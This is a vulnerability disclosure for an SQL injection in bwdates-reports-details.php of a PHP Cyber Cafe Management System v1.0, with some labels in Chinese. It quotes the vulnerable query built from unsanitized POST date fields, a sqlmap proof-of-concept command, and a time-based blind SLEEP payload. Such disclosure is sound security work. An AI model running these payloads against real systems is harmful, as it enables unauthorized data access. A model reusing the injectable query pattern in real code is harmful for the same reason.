# SQLi vulnerability in Cyber Cafe Management System Project v1.0 of file bwdates-reports-details.php

**vender**:

[PHP Project, PHP Projects Ideas, PHP Latest tutorials, PHP oops Concept](https://phpgurukul.com/)

[Cyber Cafe Management System Using PHP & MySQL , Cyber Cafe Management System Project](https://phpgurukul.com/cyber-cafe-management-system-using-php-mysql/)

**SoftLink**:

[Cyber Cafe Management System Using PHP & MySQL , Cyber Cafe Management System Project](https://phpgurukul.com/cyber-cafe-management-system-using-php-mysql/)

**Vulnerable File**

- ccms\bwdates-reports-details.php

**Version**

- V1.0

### Analyse

`ccms\bwdates-reports-details.php:77-98` - 日期报表SQLi

bwdates-reports-details.php:77-98

```
$fdate=$_POST['fromdate'];
$tdate=$_POST['todate'];
...
$ret=mysqli_query($con,"select *from tblusers where date(InTime) between '$fdate' and '$tdate'");
```

- **参数**: `fromdate`, `todate` (POST)
- **类型**: SELECT注入

### POC

```bash
sqlmap -u "http://192.168.93.1/ccms/bwdates-reports-details.php" --data="fromdate=admin&todate=admin&submit=Submit" --dbms=mysql
--cookie="PHPSESSID=q8vu4tgrhj01ikmjm3u469chil" --level=2
```



```
---
Parameter: fromdate (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: fromdate=admin' AND (SELECT 6094 FROM (SELECT(SLEEP(5)))tBUu) AND 'kThN'='kThN&todate=admin&submit=Submit
---
```



![image-20251212114754214](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512121147283.png)